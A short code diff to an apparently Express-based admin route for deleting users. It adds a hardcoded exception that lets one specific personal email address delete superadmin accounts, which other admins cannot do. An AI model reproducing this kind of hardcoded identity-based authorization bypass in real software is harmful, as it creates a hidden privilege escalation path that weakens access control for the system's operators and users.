@@ -81,7 +81,8 @@ router.delete('/:id', authenticate, authorize('admin'), async (req, res) => {
       return res.status(400).json({ error: 'You cannot delete your own account' });
     }
     const targetUser = await User.findById(targetId);
-    if (targetUser && String(targetUser.role || '').toLowerCase() === 'superadmin') {
+    const isOwnerOverride = String(req.user?.email || '').toLowerCase() === 'faiqsajjad652@gmail.com';
+    if (targetUser && String(targetUser.role || '').toLowerCase() === 'superadmin' && !isOwnerOverride) {
       return res.status(403).json({ error: 'Cannot delete a super admin account' });
     }
     await User.delete(targetId);
